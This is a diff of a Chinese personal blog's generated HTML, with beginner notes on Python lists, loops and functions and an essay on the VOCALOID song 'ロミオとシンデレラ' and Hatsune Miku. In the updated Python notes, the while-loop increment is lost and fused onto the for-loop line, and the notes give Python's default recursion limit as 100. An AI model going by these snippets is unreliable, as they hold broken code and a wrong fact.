-<p>调用形式类似数组：List[0]<br>Tips:并非是数组——列表中自带一些方法提供现成的功能。使用”.”调用方法(和许多语言一样)</p>
+<h1 id="Python中使用的列表"><a href="#Python中使用的列表" class="headerlink" title="Python中使用的列表"></a>Python中使用的列表</h1><p>创建格式：List &#x3D; [“Object1”,”Object2”,”Object3”]<br><strong>Tips：无需声明类型——Python变量标识符没有类型。对于列表来说，数据项的类型并不重要。Python只需要知道给列表指定了名字，同时名字中包含有一些数据项。</strong></p>
+<p>调用形式类似数组：List[0]<br><strong>Tips:并非是数组——列表中自带一些方法提供现成的功能。使用”.”调用方法(和许多语言一样)</strong></p>
 <table>
 <thead>
 <tr>
-<th>代码</th>
+<th>函数</th>
 <th>功能</th>
 </tr>
 </thead>
@@ -546,37 +734,30 @@ if __name__ == &quot;__main__&quot;:
 <td>insert()</td>
 <td>在特定位置前增加数据项</td>
 </tr>
+<tr>
+<td>在python中，列表项中可以嵌套列表，调用内容形式类似二位数组</td>
+<td></td>
+</tr>
 </tbody></table>
-<p>在python中，列表项中可以嵌套列表，调用内容形式类似二位数组<br>Python循环</p>
-<pre><code>for 目标标识符 in 列表:
-   #不用大括号真不戳
-   #代码代码代码
-   #缩进才能被编译器分析
+<h1 id="Python循环"><a href="#Python循环" class="headerlink" title="Python循环"></a>Python循环</h1><pre><code>for 目标标识符 in 列表:
+    #不用大括号真不戳
+    #代码代码代码
+    #缩进才能被编译器分析
 </code></pre>
-<p>在迭代中python会将列表中值依次赋予标识符  </p>
+<p>在迭代中python会将列表中值依次赋予标识符</p>
 <pre><code>count = 0
 while count &lt; len(list):
 print(list[count])
-count = count + 1	
 </code></pre>
 <p>和</p>
-<pre><code>for each_item in list:      
+<pre><code>count = count + 1	for each_item in list:      
 print(each_item)
 </code></pre>
-<p>以上两段代码结果等效<br>·当循环中读取到列表时，print会将列表原样打印（包括中括号）<br>想要单独输出列表中的列表时，可以使用if语句  </p>
-<pre><code>if 条件1:
-    #条件1为真执行此处代码
-elif 条件2:
-    #条件2为真执行此处代码
-elif 条件3:
-    #条件3为真执行此处代码
-else:
-    #条件均为假执行此处代码
-</code></pre>
+<p>以上两段代码结果等效<br><strong>Tips:当循环中读取到列表时，print会将列表原样打印（包括中括号）</strong><br>想要单独输出列表中的列表时，可以使用if语句<br>    if 条件1:<br>        #条件1为真执行此处代码<br>    elif 条件2:<br>        #条件2为真执行此处代码<br>    elif 条件3:<br>        #条件3为真执行此处代码<br>    else:<br>        #条件均为假执行此处代码</p>
 <h1 id="Python-函数"><a href="#Python-函数" class="headerlink" title="Python 函数"></a>Python 函数</h1><pre><code>def 函数名( 参数表 ): 参数表可留空，但必须有括号
     函数代码组
 </code></pre>
-<p>在函数中调用自身可以实现递归。默认递归深度不超过100，但在需要时可以修改。<br>Tips:<br> “BIF”内置函数<br>“组”Python代码块，用缩进指示分组</p>
+<p>在函数中调用自身可以实现递归。默认递归深度不超过100，但在需要时可以修改。<br><strong>Tips:<br> “BIF”内置函数<br>“组”Python代码块，用缩进指示分组</strong></p>
 
       
     </div>
@@ -620,14 +801,14 @@ else:
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2022-03-23 20:22:21" itemprop="dateCreated datePublished" datetime="2022-03-23T20:22:21+08:00">2022-03-23</time>
+              <time title="创建时间：2022-03-23 22:37:03" itemprop="dateCreated datePublished" datetime="2022-03-23T22:37:03+08:00">2022-03-23</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-02-07 00:47:30" itemprop="dateModified" datetime="2023-02-07T00:47:30+08:00">2023-02-07</time>
+                <time title="修改时间：2023-02-07 22:40:05" itemprop="dateModified" datetime="2023-02-07T22:40:05+08:00">2023-02-07</time>
               </span>
 
           
@@ -645,24 +826,25 @@ else:
 <p><del>而且还短</del></p>
 <p><del>还没什么内容</del></p>
 <h1 id="0、写在前面"><a href="#0、写在前面" class="headerlink" title="0、写在前面"></a>0、写在前面</h1><p>建站也已经有一段时间了，但是至今都仍然什么都没有写。本着多少都要写点什么的精神，我决定开始写作本博客的第一个专栏。这个专栏会不定期写一些有关我喜欢歌曲的杂谈，聊聊和歌有关的故事。</p>
-<h1 id="一、这次的歌——ロミオとシンデレラ"><a href="#一、这次的歌——ロミオとシンデレラ" class="headerlink" title="一、	这次的歌——ロミオとシンデレラ"></a>一、	这次的歌——ロミオとシンデレラ</h1><p>作为本专栏的第一篇文章，我想讲的歌是doriko的《ロミオとシンデレラ》（罗密欧与辛德瑞拉）。</p>
+<h1 id="一、这周的歌——ロミオとシンデレラ"><a href="#一、这周的歌——ロミオとシンデレラ" class="headerlink" title="一、	这周的歌——ロミオとシンデレラ"></a>一、	这周的歌——ロミオとシンデレラ</h1><p>作为本专栏的第一篇文章，我想讲的歌是doriko的《ロミオとシンデレラ》（罗密欧与辛德瑞拉）。</p>
 <p>这大概是我最早听的几首VOCALOID歌曲，当时还是初中生或者小学生。时间久远，我只能记得当时是一个晚上——可能是听说了什么——于是一口气在歌单里导入了大量初音未来的歌，其中就包括这首《ロミオとシンデレラ》。</p>
-<p>其实一开始我听日文VOCALOID的时候，听不懂歌词的内容，也不懂乐理<del>（现在也不是很懂）</del>，可能是音乐本身就带有一种魔力，我很快就迷上了初音未来带点电子感，缺乏真实感的女声。</p>
-<p>《ロミオとシンデレラ》最早在2009年被投稿到niconico上<del>属于是老歌了</del>，当前播放量达到了899万。我个人认为这属于VOCALOID早期名曲之一，也曾多次在初音未来的演唱会上登场。这首歌给我留下的印象很深，它给“我心中的初音未来”形象的构成起了极大的影响。</p>
+<p>其实一开始我听日文VOCALOID的时候，听不懂歌词的内容，也不懂乐理（现在也不是很懂），可能是音乐本身就带有一种魔力，我很快就迷上了初音未来带点电子感，缺乏真实感的女声。</p>
+<p>《ロミオとシンデレラ》最早在2009年被投稿到niconico上属于是老歌了，当前播放量达到了899万。我个人认为这属于VOCALOID早期名曲之一，也曾多次在初音未来的演唱会上登场。这首歌给我留下的印象很深，它给“我心中的初音未来”形象的构成起了极大的影响。</p>
 <p>这首歌的歌词乍一看会有点像“小黄歌”。实际上，如果仔细考虑歌词背后的含义，则会看到一个有点叛逆，希望能够打破父母的约束，想要逃离责骂的女孩。同时，她又向往着自己心中的罗密欧能够给自己带来一场恋爱。</p>
 <p>在《罗密欧与朱丽叶》中，男女主人公的爱情并不能受人认可；而在《灰姑娘》的故事中，辛德瑞拉是由“谎言”构成的仅限于午夜之前的美好。在歌曲里，很显然少女所爱的男孩并不能让她的父母满意，因此少女只能在“大人睡觉的时间”后悄悄和心上人相会。“今晚究竟能够进展到何处呢？”少女就像辛德瑞拉一样，用谎言包裹着自己，“魔法啊，请让时间停止吧”，想要和心上人多相处一会。</p>
-<h1 id="二、VOCALOID与初音未来"><a href="#二、VOCALOID与初音未来" class="headerlink" title="二、	VOCALOID与初音未来"></a>二、	VOCALOID与初音未来</h1><p>VOCALOID<del>（俗称术力口,是日语ボカロ的幻视）</del>是日本YAMAHA开发的系列电子歌声合成软件，当用户在软件中输入音调和歌词，软件就会合成相对贴近人声但又有所区别的歌声。</p>
+<h1 id="二、VOCALOID与初音未来"><a href="#二、VOCALOID与初音未来" class="headerlink" title="二、	VOCALOID与初音未来"></a>二、	VOCALOID与初音未来</h1><p>VOCALOID<del>（俗称术力口是日语ボカロ的幻视）</del>是日本YAMAHA开发的系列电子歌声合成软件，当用户在软件中输入音调和歌词，软件就会合成相对贴近人声但又有所区别的歌声。</p>
 <p>VOCALOID引擎的使用者（通称“P主”），会在引擎里面调整具体的各种参数，来找到自己想要的音色。《ロミオとシンデレラ》的作者doriko就是一位相对有名的P主，被他的粉丝称为“抒情歌之神”。VOCALOID系列软件和它衍生出的虚拟歌手，在P主的手中被赋予了灵魂。在P主的创造下，他们不再是冷冰冰的工具，而是一个个活生生的人。</p>
 <div style="text-align: center">
-    <img src="《罗密欧与辛德瑞拉》还有初音未来\Hatsune_miku_v2.png" style="zoom:20%" alt="VOCALOID2中初音未来的形象" align=\>
+    <img src="Hatsune_miku_v2.png" style="zoom:20%" alt="VOCALOID2中初音未来的形象" align=\>
     <br>VOCALOID2中初音未来的形象
     </img>
 </div>
 
-<p>初音未来（日语：初音ミク）是Crypton用 YAMAHA VOCALOID引擎独立开发的虚拟歌手。（ps:现在Crypton出来单干，改用自家的NT引擎了）在2007年8月31日发售的第一个使用VOCALOID2引擎的日语软件。“初音”指“初始之音”或“最初的声音”，而“未来”指则象征着这种合成音乐未来无尽的可能性。</p>
+<p>初音未来（日语：初音ミク）是Crypton用 YAMAHA VOCALOID引擎独立开发的虚拟歌手。（ps:当然现在Crypton出来单干，改用自家的NT引擎了）在2007年8月31日发售的第一个使用VOCALOID2引擎的日语软件。“初音”指“初始之音”或“最初的声音”，而“未来”指则象征着这种合成音乐未来无尽的可能性。</p>
 <h1 id="三、有的没的"><a href="#三、有的没的" class="headerlink" title="三、	有的没的"></a>三、	有的没的</h1><p>最后，说点有的没的。</p>
-<p>其实我听过的歌还挺多，从古典到摇滚再到电音都会听一点。但是我还是选择了初音未来的这首歌作为这个专栏的一个开始。初音未来和她的歌贯穿了我的整个中学时代，并一直连接到大学时代，在可以预见的将来也会陪我一直走下去。这首歌我前面也说过了，是我最早听过的几首初音未来的歌，也是我心中初音形象的一部分，所以才拿这首歌还有“初音”作为这个专栏的第一篇文章。<br>这个专栏以后写的内容应该主要都会是我听的一些歌，以及和这首歌相关东西的介绍一类的短篇杂谈，有问题当然在所难免。不过，这也只是一个图一乐的个人杂谈，有什么问题，直接指出来（但我不一定会改）。</p>
-<p>文章部分资料来源于萌娘百科<br>文字内容默认使用《知识共享 署名-非商业性使用-相同方式共享 3.0》协议。<br>链接：<br><a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/VOCALOID">https://zh.moegirl.org.cn/VOCALOID</a><br><a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/%E5%88%9D%E9%9F%B3%E6%9C%AA%E6%9D%A5">https://zh.moegirl.org.cn/初音未来</a><br><a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/Doriko">https://zh.moegirl.org.cn/Doriko</a><br><a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/%E7%BD%97%E5%AF%86%E6%AC%A7%E4%B8%8E%E8%BE%9B%E5%BE%B7%E7%91%9E%E6%8B%89">https://zh.moegirl.org.cn/罗密欧与辛德瑞拉</a>  </p>
+<p>其实我听过的歌还挺多，从古典到摇滚再到电音都会听一点。但是我还是选择了初音未来的这首歌作为这个专栏的一个开始。初音未来和她的歌贯穿了我的整个中学时代，并一直连接到大学时代，在可以预见的将来也会陪我一直走下去。这首歌我前面也说过了，是我最早听过的几首初音未来的歌，也是我心中初音形象的一部分，所以才拿这首歌还有“初音”作为这个专栏的第一篇文章。</p>
+<p>这个专栏以后写的内容应该主要都会是我听的一些歌，以及和这首歌相关东西的介绍一类的短篇杂谈，有问题当然在所难免。不过，这也只是一个图一乐的个人杂谈，有什么问题，直接指出来（但我不一定会改）。</p>
+<p>文章部分资料来源于萌娘百科<br>文字内容默认使用《知识共享 署名-非商业性使用-相同方式共享 3.0》协议。<br>链接：<br>    <a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/VOCALOID">https://zh.moegirl.org.cn/VOCALOID</a><br>    <a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/%E5%88%9D%E9%9F%B3%E6%9C%AA%E6%9D%A5">https://zh.moegirl.org.cn/初音未来</a><br>    <a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/Doriko">https://zh.moegirl.org.cn/Doriko</a><br>    <a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/%E7%BD%97%E5%AF%86%E6%AC%A7%E4%B8%8E%E8%BE%9B%E5%BE%B7%E7%91%9E%E6%8B%89">https://zh.moegirl.org.cn/罗密欧与辛德瑞拉</a>  </p>
 
       
     </div>
@@ -744,12 +926,12 @@ else:
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
